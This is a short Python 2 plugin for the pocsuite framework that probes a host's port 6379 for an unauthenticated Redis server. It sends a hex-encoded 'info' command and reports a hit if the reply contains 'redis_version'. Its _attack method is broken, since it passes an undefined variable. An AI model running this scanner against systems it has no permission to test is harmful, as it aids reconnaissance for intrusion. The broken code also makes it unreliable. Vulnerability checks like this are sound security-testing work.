#coding=utf-8
import socket
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.utils import url2ip

class TestPOC(POCBase):

    vulID = '0'
    version = '0'
    author = 'None'
    vulDate = 'None'
    createDate = 'None'
    updateDate = 'None'
    references = ['None']
    name = 'redis 未授权访问'
    appPowerLink = 'None'
    appName = 'redis'
    appVersion = 'None'
    vulType = 'None'
    desc = '''
    '''
    samples = ['']

    def _verify(self):
        result = {}
        url = url2ip(self.url)  # 自动判断输入格式,并将URL转为IP
        port = 6379 #默认端口6379
        payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
        s = socket.socket()
        s.settimeout(5)
        try:
            if isinstance(url,tuple):
                host = str(url[0])
            else:
                host = str(url)
            s.connect((host, port))
            s.send(payload)
            recvdata = s.recv(1024)
            s.close()
            if recvdata and 'redis_version' in recvdata:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = host + ":" +str(port)
        except Exception,e:
            s.close()
        return self.parse_attack(result)

    def _attack(self):
        return self._verify(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet noting return')
        return output


register(TestPOC)
